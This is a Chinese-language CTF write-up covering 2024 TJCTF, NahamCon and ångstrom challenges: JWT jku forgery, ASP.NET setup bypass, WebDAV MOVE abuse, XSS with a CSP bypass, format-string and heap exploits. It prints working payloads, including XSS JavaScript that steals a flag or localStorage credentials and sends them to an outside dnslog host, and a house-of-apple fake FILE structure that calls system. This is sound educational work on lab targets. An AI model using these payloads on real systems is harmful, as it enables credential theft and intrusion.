# TJCTF 2024 / NahamConCTF 2024 / ångstrom CTF 2024
[TOC]

# TJCTF 2024
高中主办的比赛，可能是最近打的几个比赛中最新手向的。Web题全部是nodejs（看得出出题人应该只会这个），PWN题也没有特别深的技巧，取证有两个题都是strings秒了。

## Web - topple container
这个题本身题目很简单，是一个文件上传+JWT公钥伪造，用到JWT里的`jku`字段，这个指向一个json资源文件，声明了JWT签名需要的公钥的URL（可以是本地也可以是http协议远程）。解题思路是上传作为jwk的json文件和公钥文件，然后利用这两个文件的远程路径构造特定JWT，使得服务器会读取我们上传的公钥进行验证。

这里记录一下pyjwt生成jwk的代码（pyjwt这方面还是没那么成熟，可能这个特性用的人很少吧）
```python
import jwt
import json
import jwt.algorithms
from Crypto.PublicKey import ECC

# generate key
mykey = ECC.generate(curve='p256')
with open('mykey.pub','w') as fp:
    fp.write(mykey.public_key().export_key(format='PEM'))

with open('mykey.priv','w') as fp:
    fp.write(mykey.export_key(format='PEM'))

# generate jwk
from cryptography.hazmat.primitives import serialization
pem_pub = serialization.load_pem_public_key(mykey.public_key().export_key(format='PEM').encode())
jwk_obj = json.loads(jwt.algorithms.ECAlgorithm.to_jwk(pem_pub))
jwk_obj['kid'] = KID
```

## pwn - fullernene
为数不多花了不少功夫的pwn题。本身只是个类似笔记管理系统的C++堆题（libc=2.36, Partial RELRO）（而且其实不是C++标准库里的隐式分配内存，而都是用malloc和free的），但是本身建立在一个很大的3D模型渲染框架上面，无关代码非常多，光是理清逻辑就需要花很大功夫。

这个题数据基本单元是`SphereChunk`这个类，在`main`函数里有一个笔记管理系统可以对chunk的内容进行增删改查。栈上有一个`SphereChunk chunk_list[64]`数组，负责管理所有的chunk（这个题也给了一个选项可以分配到堆上，不过我没用上），主要功能：

- `mkchunk`: 在栈上初始化一个chunk，但chunk的其中一个字段`chunk->verts`是malloc得到的，malloc的大小是通过几个输入参数复杂的浮点数计算得到float类型的`chunk->vol `强制转换得到，另外，在malloc后会强制清空内存，相当于calloc。
- `read` / `write`: 可以进行对`chunk->verts`进行读写操作，虽然双向判断了读写的指标不会越界，但因为其chunk size(即`chunk->vol`)是以浮点数存储的，实际上构造合适时**可以刚好溢出一个字节，即有`off-by-one`漏洞**，而且看起来这个漏洞可以对任意大小的chunk size稳定触发
- `delchunk`: 调用`~SphereChunk`析构函数，会先memset重置堆上内存，再free掉堆上内存后，把栈上内容置空。

有这些之后，我们就可以着手布置了。off-by-one经典利用方式是chunk extend，修改下一个块的size使其刚好覆盖下一个块的范围。因为这个题有`read/write`功能，所以可以把chunk extend到很大的范围，这样可以直接越界读写很多个chunk了。对这个题来说，我们可以把被覆盖掉的chunk free掉进入tcache或unsorted bin，分别泄露堆地址和LIBC地址。之后用tcache poisoning把chunk分配到GOT表，覆盖memset函数为system，析构一个`/bin/sh`的块即可


# nahamcon CTF 2024
是一个大型的相对正规的比赛，这个比赛很罕见地包含那种包含7个flag的real world向渗透题（虽然一个没做出来）。其他人的writeup应该挺多，我这里就只说我觉得有趣的了。

## web-helpfuldesk
归类为简单题，但是这个题很容易让新手抓狂。

题目本身是个简单的网页，网页上提供了几个不同版本的程序下载，特别提到了1.2版本修复了一个RCE漏洞，而网站脚注显示网站是1.1版本，所以我们主要关注这个版本，必要的时候对1.1和1.2做diff。

这个程序的目录结构看着非常唬人：
```sh
$ tree web-helpfuldesk/1.1
web-helpfuldesk/1.1
├── HelpfulDesk.deps.json
├── HelpfulDesk.dll
├── HelpfulDesk.exe
├── HelpfulDesk.pdb
├── HelpfulDesk.runtimeconfig.json
├── HelpfulDesk.staticwebassets.runtime.json
├── Humanizer.dll
├── MessagePack.Annotations.dll
├── MessagePack.dll
├── Microsoft.AspNetCore.Razor.Language.dll
├── Microsoft.Bcl.AsyncInterfaces.dll
├── Microsoft.Build.Framework.dll
├── Microsoft.Build.dll
├── Microsoft.CodeAnalysis.AnalyzerUtilities.dll
├── Microsoft.CodeAnalysis.CSharp.Features.dll
├── Microsoft.CodeAnalysis.CSharp.Workspaces.dll
├── Microsoft.CodeAnalysis.CSharp.dll
├── Microsoft.CodeAnalysis.Features.dll
├── Microsoft.CodeAnalysis.Razor.dll
├── Microsoft.CodeAnalysis.Scripting.dll
├── Microsoft.CodeAnalysis.Workspaces.dll
```

我们也很容易得知这是C#写成的.NET程序（进一步分析可以知道这个是Asp.Net框架）。.NET程序逆向可以用iLSpy进行。值得注意的是，核心逻辑并不在`Helpfuldesk.exe`而是`Helpfuldesk.dll`里，这也多亏了项目里包含了`Helpfuldesk.pdb`调试文件（所以这其实是个debug而不是release版本）。

在`HelpfulDesk.Controller`这个包里有大量Controller类，其中一个`SecurityController`刚好有我们已知的endpoints，所以这些是我们最关注的路由处理逻辑：
```c#
public class SecurityController : Controller
{
	public IActionResult Bulletin()
	{
		List<SecurityBulletin> bulletins = new List<SecurityBulletin>
		{
			new SecurityBulletin("1.1", DateTime.Now.AddMonths(-1), "Low", "Adds minor UI changes and improvements.", "/api/v1/downloads/helpfuldesk-1.1.zip"),
			new SecurityBulletin("1.0", DateTime.Now.AddMonths(-3), "Low", "This initial update addresses minor security concerns and some bug fixes.", "/api/v1/downloads/helpfuldesk-1.0.zip")
		};
		return (IActionResult)(object)((Controller)this).View((object)bulletins);
	}
}
```

经过搜寻我们会发现一个用于初始化的`SetupController`类
```c#
public class SetupController : Controller
{
	private readonly string _credsFilePath = "credentials.json";

	public IActionResult SetupWizard()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		if (File.Exists(_credsFilePath))
		{
			PathString path = ((ControllerBase)this).HttpContext.Request.Path;
			string requestPath = ((PathString)(ref path)).Value.TrimEnd('/');
			if (requestPath.Equals("/Setup/SetupWizard", StringComparison.OrdinalIgnoreCase))
			{
				return (IActionResult)(object)((Controller)this).View("Error", (object)new ErrorViewModel
				{
					RequestId = "Server already set up.",
					ExceptionMessage = "Server already set up.",
					StatusCode = 403
				});
			}
		}
		return (IActionResult)(object)((Controller)this).View();
	}

	[HttpPost]
	public IActionResult SetupWizard(string username, string password)
	{
		string filePath = Path.Combine(Directory.GetCurrentDirectory(), "credentials.json");
		List<AuthenticationService.UserCredentials> credentials = new List<AuthenticationService.UserCredentials>
		{
			new AuthenticationService.UserCredentials
			{
				Username = username,
				Password = password,
				IsAdmin = true
			}
		};
		string json = JsonSerializer.Serialize(credentials);
		File.WriteAllText(filePath, json);
		return (IActionResult)(object)((ControllerBase)this).RedirectToAction("SetupComplete");
	}

	public IActionResult SetupComplete()
	{
		return (IActionResult)(object)((Controller)this).View();
	}
}
```
我们直接GET访问`/Setup/Wizard`时会进入第一个分支，因为程序已经被初始化过所以会进入403分支。但是我们却可以POST这个URL进入重载的第二分支，这个分支没有对已初始化的判断，所以我们可以直接重写账号密码进入`credential.json`，然后用这个新的账号密码就能登录系统。

登录后就是一个远程文件管理系统了，在其中一个文件系统下面有`flag.txt`。


最后提一下，我在`DownloadsController`里还看到一个疑似路径穿越洞可以泄露`credential.json`，但是我没打通，可能是我对asp.net了解还不够
```c#
[ApiController]
[Route("api/v1/downloads")]
public class DownloadsController : ControllerBase
{
	private readonly IWebHostEnvironment _env;

	public DownloadsController(IWebHostEnvironment env)
	{
		_env = env;
	}

	[HttpGet("{fileName}")]
	public IActionResult DownloadFile(string fileName)
	{
		string fileDirectory = Path.Combine(_env.WebRootPath, "downloads");
		string filePath = Path.Combine(fileDirectory, fileName);
		if (!File.Exists(filePath))
		{
			return (IActionResult)(object)((ControllerBase)this).NotFound();
		}
		return (IActionResult)(object)((ControllerBase)this).PhysicalFile(filePath, "application/octet-stream", Path.GetFileName(filePath));
	}
}

```

PS: 我在一个[writeup](https://github.com/BaadMaro/CTF/tree/main/NahamCon%20CTF%202024/HelpfulDesk)里看到用类似synk这种工具自动化扫洞，结果能扫出来两个Path Traversal，这种操作果然还是太高端了。

## web - DAVinci Code
这个题，一上来点进链接`/code`就会直接触发Flask debug模式报错

```python
        abort(405)
    abort(404)
 
@app.route('/code')
def code():
    return render_template("code.html")
 
@app.route('/', methods=['GET', 'PROPFIND'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
```

可以看出主页支持PROPFIND方法。虽然没有立刻认出来，但是请求之后看到那么多XML，也该意识到这个其实是属于WebDAV文件协议的，这个PROPFIND其实是用来遍历目录结构的。然而，这个WebDAV是不完整的，因为最关键的获取文件内容的`GET`方法被重写了。

之后，我突发奇想对主页进行了`OPTIONS`请求，发现它还支持MOVE方法。根据文档，这个MOVE方法可以请求文件移动（需要加一个Destination HTTP头）。我们可以把关心的文件（比如源码和flag）移动到flask的static目录，从而直接读取（不过这个flask应该是debug模式吧，按说移动源码应该会导致flask重载）

## forensic - 1337 malware
给了一个流量包。分析可以知道，受害者下载并执行了一个Python代码，根据python代码我们知道是把同目录所有文件进行cyclic xor后用socket发送到远程服务器。之后根据TCP Stream记录，发送了多个文件，包括一个PNG，一个PDF，一个ZIP包，一个SSH格式id_rsa id_rsa.pub公私钥文件。

这里面最长的已知明文是OPENSSH的私钥文件：
```s
-----BEGIN OPENSSH PRIVATE KEY-----
```
实际上已知密钥比这个明文要短（已经循环了），所以可以复原出所有文件。最后flag在加密的ZIP包里，而密码在PDF文件里。

# angstorm 2024
这个比赛也号称是给高中生办的，但是我的感觉是虽然送分题很多，但是难题也多（虽然不少题比较猜，或者比较怪）。特别是Web题里大量的XSS题目给人印象深刻

## web - markdown
XSS之1，这个题算是一个markdown的静态挂载服务，可以由nodejs服务器用`marked`渲染后显示。也有一个`/flag` endpoint，但是必须要有cookie，想必XSSBOT是有这个cookie的。

虽然marked过滤了`script`标签，但我们仍然可以用`img`标签的`onerror`属性来执行内联javascript代码。此外这个题的XSSBOT是通外网的，因此可以用`DNSlog`平台带出数据

> 关于带出数据：
> 我目前用的[dnslog.org](https://dnslog.org/)忽略大小写，有些特殊符号不行（特别是Base64的部分符号），子域名长度也有限制，总的来说没那么好用。
> 一般还有个解决方案是用BUUOJ的apache的access log，但是很大的问题是它是HTTP的，而从HTTPS对HTTP进行fetch会被mixed content policy阻止，所以可能还得要其他方案（如果有一套自动把BUUOJ的HTTP改为HTTPS + 自签名证书的代码就比较理想了）

```javascript
fetch('/flag').then((res)=>{return res.text()}).then((text)=>
	{var s=encodeURIComponent(text).replaceAll('%','-');console.log(s);
	fetch(`https://${s}.5c910bcd.log.dnslog.biz`)})

<img src="" onerror="{{code}}"/>
```

## web - tickler （好题）
XSS之2，这个题是我第一次接触浏览器的`Content-Security-Policy`（或者CSP），这个技术算是从浏览器层面阻止XSS的一道防线，限定了可以被加载的资源（主要可以通过资源的位置/hash来限制）。这个题的`script-src 'self'`就限定了所有javascript资源只能来自同源。

这个题虽然本身复杂，但是其实还是一个用户账户系统，我们可以注册登录普通权限账户，但需要有特定TOKEN才能注册admin账户（难度和获取FLAG一样）（对应到题目中，就是一个Tickler的属性为有限整数；admin账户是Infinity）。这个题大部分API都是通过trpc实现的，不过和这个题关系不大，只是让前端代码变复杂了。

### XSS和CSP

本题XSS点在于`/login?error={{xxx}}`这里是用的`innerHTML`，而且没有过滤。虽然我是fuzz出来的，但是似乎正确做法是去看前端代码`/build/client.js`，绝大多数编辑页面内容的JS代码都是用的`dom.textComponent`，这个属性按MDN的说法几乎是XSS free的（除非某些特殊情况，比如script tag里用这个可能会出问题）。然而，内联script标签属于`unsafe-inline`，而目前CSP规则是同源（`self`），因此直接在error这里内联是会被阻止的，这包括两个层面：

- 根据HTML5 spec，通过innerHTML增加的script tag不应被执行（和CSP无关）
- 通过img.onerror, svg.onload等方式回调的代码，属于`unsafe-inline`范畴

破局点在于一个`setPicture`这个功能，它可以用来设置用户的头像。具体来说，我们可以提供一个URL，服务器fetch这个URL后，拿到mime type和data后存储，随后在请求`/picture?username={{user}}`时，以`data:{type};base64,{b64encoded_data}`的形式返回。这里对mime type没有任意限制，如果有一个我们可以控制的服务器，我们可以往mime type里塞任何东西。

另外，这个题CSP规则是不完整的，并没有禁止`iframe`（如果有`X-fram-options: deny`之类的规则就不行了）。`iframe`的srcdoc属性可以指定一个字符串为iframe的内容，而这个`srcdoc`里引入的script tag会绕过HTML5标准对`innerHTML`的限制。但与此同时，我在`iframe`的`srcdoc`里引入主站的资源，又会被认为是同源的，不会被CSP规则阻止（这个点在我看来颇为诡异，除非认为主页面和iframe.srcdoc是同源的，不然这个script只是对于主页面是同源的，对iframe来说就不应该同源。当然可能把iframe.src指定为跨域，就不算同源了，说不好）

从结果来看，使用这样的payload:
```html
/login?error=</p><iframe srcdoc="<script src='/picture?username={{user}}'></script>"></iframe><p>
```
就能把之前上传的图片当成javascript代码加载并运行。


### 定制MIME Type
根据手头资源，我还是使用了BUUOJ提供的Apache服务器，host一个jpg文件（不需要是真的），然后改变其mime type。具体来说：

- 在config文件中，添加这个设置，并`service apache2 restart`
```xml
<Directory "/var/www/html">
	AllowOverride FileInfo
</Directory>
```
- 加入一个`.htaccess`文件，加入:`AddType '{{code}}' ".jpg"`，其中`{{code}}`是mimetype

到这一步就可以定制mimetype了，我们可以上传到我们控制的账户作为头像。

接下来就是如何让这个data协议的数据成为一段合法的javascript代码，在只可控mime的情况下，我们可以：
- 掐头：以`1;`开头，`data:1;`似乎是一行合法的javascript代码，虽然不知道为什么。这样会阻止报错。
- 去尾：注释：`//`

最后需要处理一些细节问题：
- Apache返回的mime type是全小写的，因此如果需要大写字母（`localStorage`）需要想办法绕过（`window["local\x53torage"]`）
- eval禁用，因为`eval`属于`unsafe-eval`，并不属于同源。

通过分析代码可以知道，credential是在localStorage里的。所以最终我们需要把XSSBOT的localStorage中的值带出来。具体做法在上面都展示了，不再赘述。最终MIME Type是：

```javascript
1;console.log("execed");var ls=window["local\x53torage"];
var u=ls["username"] ?? "no"; var p=ls["password"] ?? "no";
fetch("https://"+ls.username+"."+ls.password+".31f767c0.log.dnslog.biz");//
```

当我们看到一条`310d0b5bed9d16b83b76998131801567.078942ab69083745a318f253a343fcfa.31f767c0.log.dnslog.biz.`的解析记录时，就知道已经成功了。

#### 碎碎念

我反应过来XSSBOT是有admin权限账户的credential其实过了很久。当然这可能和我不熟悉nodejs的http模块有关，比如下面这一长串代码其实只相当于`express`的`req.body`（当然可能还是不完全一样，下面data返回的是字符串）

```js
const body: Buffer[] = []
req.on('data', (chunk) => body.push(chunk))
await new Promise((resolve) => req.on('end', resolve))

const data = Buffer.concat(body).toString()
```
另外这个题只给了服务端`typescript`代码，我一直没把环境搭好，所以一直是静态分析。

## web - winds
这个题是考随机数种子 + 模板注入的。模板注入部分很常规，只是记录一下，给定种子时如何还原`random.shuffle`：
```py
# https://crypto.stackexchange.com/questions/78309/how-to-get-the-original-list-back-given-a-shuffled-list-and-seed
def shuffle_under_seed(ls, seed):
  # Shuffle the list ls using the seed `seed`
  random.seed(seed)
  random.shuffle(ls)
  return ls

def unshuffle_list(shuffled_ls, seed):
  n = len(shuffled_ls)
  # Perm is [1, 2, ..., n]
  perm = [i for i in range(1, n + 1)]
  # Apply sigma to perm
  shuffled_perm = shuffle_under_seed(perm, seed)
  # Zip and unshuffle
  ls = list(zip(shuffled_ls, shuffled_perm))
  ls.sort(key=lambda x: x[1])
  return [a for (a, b) in ls]
```

## web - pastebin
很难归类但是挺有意思的一个题。这个题维护了一个字典，我们可以插入内容，但其键值是插入字符串的id，之后会把id返回，我们可以根据id反查内容：
```py
data = await request.post()
content = data.get('content', '')
paste_id = id(content)

add_paste(paste_id, content)
```

在`cpython`中，id返回的就是对应变量的地址。

在初始化时，服务器把flag以id=0插入到字典中，但是获取这个字典我们需要获取一个`ADMIN_PASSWORD`，否则就会返回`ADMIN_PASSWORD`的前6位。

这个`ADMIN_PASSWORD`颇为有趣：
```py
ADMIN_PASSWORD = hashlib.md5(
    f'password-{secrets.token_hex}'.encode()
).hexdigest()
```
这个`secrets.token_hex`是个函数。本来如果它被正常调用了，再md5，就无法破解了。但这里作者故意不小心忘了，那么这里就会成为这样格式的字符串：`<function token_hex at 0x..........>`

所以我们只需要把这个地址爆出来就行了。因为能泄露其他字符串的地址，所以能知道python堆地址段的大致偏移，同时也可以知道字符串地址是0x10对齐的（似乎对某些特定字符串也有0x8对齐的），还知道md5 hash前6位，所以我们只需要本地向上/向下遍历爆破一下就可以找到了。

## web - store
只是一个SQL注入，但是始终没找到类似`information_schema.tables`这样的元数据，也没有任何类似`syscolumns`, `@@version`, `version()`这种可以显示数据库版本的信息。我可以爆出源语句是`select id, name, detail from items where name = '{{input}}'`，但是`items`表里只有这三个条目，也没找到别的

## pwn - og


```c
int main(void)

{
  go();
  return 0;
}


long go(void)

{
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  printf("kill $PPID; Enter your name: ");
  FUN_004010a0_fgets(local_38,0x42,stdin);
  printf("Gotta go. See you around, ");
  printf(local_38);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```
经典格式化字符串漏洞。GOT可写，无PIE。输入可以覆盖到canary和返回地址。

考虑到题目没有循环，第一步可以考虑`%hn`覆盖`__stack_chk_fail`函数的后两位到`go`函数（此时因为没有调用这个函数，现在这里还是plt表的地址，所以可以复写），顺便从GOT表泄露LIBC。因为栈长度合适（`CALL go; PUSH RBP ;SUB RSP, 0x30`，所以不会触发`printf`的栈对齐问题）

接下来准备修改GOT表，应当注意：不能修改`printf`为`system`，因为这个题前面有一个`kill $PPID;`，被执行后会杀死这个程序的父进程，导致子进程终止。但是可以修改`setbuf`为`system`，下一轮会调用`system(stdin);`等，但是system即使失败了程序也可以继续运行，所以这句命令没有问题。之后只要把`stdin`改掉，就可以了。

## pwn - leftright

```c
void main(void)

{
  int iVar1;
  undefined *puVar2;
  undefined *puVar3;
  long in_FS_OFFSET;
  short local_36_marker;
  int local_34_choice;
  int local_30_exitflag;
  int local_2c;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  printf("Name: ");
  fgets(local_28,0xf,stdin);
  local_36_marker = 0;
  arr[0] = 1;
  local_30_exitflag = 0;
  do {
    if (local_30_exitflag != 0) {
      puts("bye");
                    /* if puts@got changed to ... */
      puts(local_28);
      if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
        return;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    local_34_choice = 0;
    __isoc99_scanf("%d",&local_34_choice);
    getchar();
    if (local_34_choice == 3) {
                    /* 3=exit */
      local_30_exitflag = 1;
    }
    else if (local_34_choice < 4) {
      if (local_34_choice == 2) {
                    /* 2=write */
        iVar1 = getchar();
        arr[(int)local_36_marker] = (byte)iVar1;
      }
      else if (local_34_choice < 3) {
        if (local_34_choice == 0) {
                    /* 0= prev but no overflow */
          if (local_36_marker == 0) {
            puts("hey!");
                    /* WARNING: Subroutine does not return */
            exit(1);
          }
          local_36_marker = local_36_marker + -1;
        }
        else if (local_34_choice != 1) goto LAB_001012d7;
                    /* 1=right can flow up */
        local_36_marker = local_36_marker + 1;
      }
    }
LAB_001012d7:
    for (local_2c = 0; local_2c < 0x14; local_2c = local_2c + 1) {
      if ((local_2c == 0) || (local_2c == 0x14)) {
        puVar3 = &DAT_00102013_null;
      }
      else {
        puVar3 = &DAT_00102014_|;
      }
      if (arr[local_2c] == 0) {
        puVar2 = &DAT_00102018_space;
      }
      else {
        puVar2 = &DAT_00102016_x;
      }
      printf("%s%s",puVar2,puVar3);
    }
    putchar(10);
  } while( true );
}
```

这个题考察整数溢出，难点在于输出手段有限的情况下如何泄露地址。栈上没有缓冲区溢出。

经典菜单题，主要是控制`short local_36_marker`这个整数，作为`arr`这个`char *`的指标，主要功能包括：
- 0：marker -= 1，但是当marker为0时，会调用`puts("hey!"); exit(1);`
- 1: marker += 1，这里没有检查，因此可以溢出到负数。
- 2: 向`arr[local_36_marker]`写入一个字节。
- 3: 退出，调用`puts("bye"); puts(local_28);`，之后检查canary，正常返回（这里提一句，返回到`__libc_start_main`之后，调用exit似乎是不会经过GOT表）。

`arr`位于BSS段，因此首先要让`marker`溢出到低地址的GOT表段。注意这里我们暂时没有输出手段，唯一的机会是把puts改为printf，利用`printf(local_28)`这个可控的rdi获得地址。这里注意我们在LIBC没有泄露的情况下，只能修改没有被调用的函数的地址（puts, 爆栈，exit），因为这时puts的地址还是PIE偏移后的PLT表地址，而我们已知的是printf的plt地址偏移，共同的只有低12位，只要爆出1/16的概率就能获得成功修改。（本地调试建议暂时关闭ASLR）。

但是更关键的问题在于，如果我们走了3的分支，因为我们无法爆栈（可以修改成scanf爆栈，不过那个思路我没走通，不知道能否可行），程序会从main正常返回后结束。所以我们最好顺便修改`exit`和`__stack_chk_fail`的地址到`main`，然后走0的报错分支，这样在main函数栈上又会叠加新的main函数调用栈。考虑到每次走3分支的时候会从main函数返回，调用栈深度-1，所以轮流进入这两个分支就可以堆栈平衡。

> PS: 之前不知道main函数能不能成功返回，我还尝试过一个神奇的玩法，用尝试把puts覆盖为scanf，然后利用`scanf("%12$s")`这样的语句触发爆栈，返回main函数，当然最终证明大可不必了。

之后就相对简单了，通过格式化字符串泄露PIE地址，然后再根据PIE构造能泄露GOT表项的格式化字符串，获得LIBC地址。最后再溢出到GOT处，把puts改为system，最后走3分支。


最后还要解决一个问题，就是因为这个提要求的输入输出都很大，加上服务器本身很卡，我们要想个办法在服务器超时断连之前完成任务。我意识到主要的时间都花在把那个short溢出到负数的过程中。在socket通信中，如果我们每一轮输入都等待对面全部输出后再返回就会很慢。但是假如我们可以把多组数据一起输入，减少交互的轮数。但同时，如果我们一次性把60000多轮输入一次发送，大概会撑爆对面的缓冲区，导致阻塞。最终调试下来，似乎一轮发送0x200组（0x400字节）是最快的，这可能和MTU有关。


## pwn - heapify
新生代（2.35保护全开）堆题，第一次学习house of apple

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define N 32

int idx = 0;
char *chunks[N];

int readint() {
	char buf[0x10];
	read(0, buf, 0x10);
	return atoi(buf);
}

void alloc() {
	if(idx >= N) {
		puts("you've allocated too many chunks");
		return;
	}
	printf("chunk size: ");
	int size = readint();
	char *chunk = malloc(size);
	printf("chunk data: ");

	// ----------
	// VULN BELOW !!!!!!
	// ----------
	gets(chunk);
	// ----------
	// VULN ABOVE !!!!!!
	// ----------
	
	printf("chunk allocated at index: %d\n", idx);
	chunks[idx++] = chunk;
}

void delete() {
	printf("chunk index: ");
	int i = readint();
	if(i >= N || i < 0 || !chunks[i]) {
		puts("bad index");
		return;
	}
	free(chunks[i]);
	chunks[i] = 0;
}

void view() {
	printf("chunk index: ");
	int i = readint();
	if(i >= N || i < 0 || !chunks[i]) {
		puts("bad index");
		return;
	}
	puts(chunks[i]);
}

int menu() {
	puts("--- welcome 2 heap ---");
	puts("1) allocate");
	puts("2) delete");
	puts("3) view");
}

int main() {
	setbuf(stdout, 0);
	menu();
	for(;;) {
		printf("your choice: ");
		switch(readint()) { 
		case 1:
			alloc();
			break;
		case 2:
			delete();
			break;
		case 3:
			view();
			break;
		default:
			puts("exiting");
			return 0;
		}
	}
}

```
有增删查功能的笔记管理系统，增的输入部分是`gets`天然可溢出但是会截断字符串，恰好查的函数是`puts`，所以是要想办法解决这个问题。删的代码会把指针置空，因此也没有悬垂指针。

首先是泄露地址，这个题最重要的是要让两个指针指向同一个地址。考虑到chunk extend特性，我们完全可以先分配一个初始堆块，再分配一系列堆块，然后释放初始堆块进入tcache，再申请回来，利用gets覆盖下一个堆块覆盖之前分配的全部堆块，然后把下一个堆块释放掉，我们就获得了一个巨大的unsorted bin堆块，覆盖了之前所有已经分配过但还没释放的堆块（我把这些堆块称为eye chunks，因为他们的功能就是用来插个眼输出）。然后我们再分配小一些的堆块时就会从unsorted bin里切，我们可以控制让某个堆块刚好等于eye chunks的地址，然后再释放掉，让他们进入对应的tcache或者unsorted bin，就可以拿到堆地址和LIBC地址。

接下来，可以考虑打tcache poisoning任意分配堆块，这个在有gets的情况下非常容易。但是这个题GOT表只读，分配新的堆块还会截断，不能读出内容，我们要打哪里呢？可以考虑打IO函数（house of apple），或者打ld的`rtld_globals`的`_fini_array`（house of banana）。这个题就非常适合打[house of apple](https://bbs.kanxue.com/thread-273832.htm)，具体来说是打`_IO_wfile_overflow`。具体攻击原理已经被师傅们挖掘出来了，我这里只是拾人牙慧套用一下罢了。

house of apple，原本是large bin attack的应用，large bin attack可以在指定位置写入一个堆地址。总体的方法论是泄露地址后，在堆上布置假的结构，然后只改一个地址写入特定hook函数，突出一个一击脱离。这里虽然我们用的tcache poisoning，但因为分配后只有一次盲写的机会，其实效果是类似的。

故事要从`stdout=_IO_2_1_stdout_`（或stdin, stderr）的vtable说起。它的默认值是`_IO_file_jumps`。老版本中，我们可以直接修改整个vtable，但现在对vtable的地址范围加了检查（在只读区域）。但我们可以把`vtable`改为`_IO_wfile_jumps`，而对应`struct _IO_wide_data`的`_wide_vtable`中成员调用时，没有地址检查，因此我们可以堆上构造一个假的`_wide_data`和假的`_wide_vtable`，再复写`_IO_2_1_stdout_`的flag让它产生类型混淆。总结下来我们准备三样东西（可以把这三样东西放在堆的连续地址上，当然分开也不是不行）：

- 假的`_wide_vtable`
- 假的`struct _IO_wide_data`，
- 类型混淆的`fake file`，

似乎largebin attack版本要把fake file写到堆上，然后把bss段的stdout地址覆盖为堆上fake file地址。不过我这里是直接改的LIBC堆空间`_IO_2_1_stdout_`的原始数据了，反正溢出范围够大。

```py
# fake file is 0xe0 long
fake_file = bytearray(0xe0)

cmd = b';cat flag.txt;'
# fake_file[0:8] = b'  sh;'.ljust(8, b'\x00')
# this flag is rdi, but it also should bypass certain check
fake_file[0:8] = p64(2**64 + ~(2|8|0x800))
fake_file[8:8 + len(cmd)] = cmd

fake_file[0xa0:0xa8] = p64(fake_widedata_addr)
fake_file[0xd8:0xe0] = p64(LIBC + libc.symbols['_IO_wfile_jumps'])
fake_file = bytes(fake_file)

# fake vtable, 
# first 0x100 is struct _IO_wide_data, 
# second 0x100 is struct _IO_jump_t *_wide_vtable;
fake_vtable = bytearray(0x200)
fake_vtable[0x18:0x20] = p64(0)
fake_vtable[0x30:0x38] = p64(0)
fake_vtable[0xe0:0xe8] = p64(fake_widedata_addr + 0x100)

fake_vtable[0x168:0x170] = p64(LIBC + libc.functions['system'].address)
fake_vtable = bytes(fake_vtable)

fake_iofile_idx = alloc(0x208, fake_vtable)
```
这里特别提一下，`fake_file`的flag需要满足类型混淆的要求，但`fake_file`本身也会作为vtable hook函数的rdi，所以如果要调用system，这里得用类似`;/bin/sh;`这样的方式处理。

flag是`actf{wh3re_did_my_pr3c1ous_fr33_hook_go??}`，现在没有free hook也能打堆题了，哈哈。

留一下code，以供后面参考：[exp](pwn-heapify/exp.py)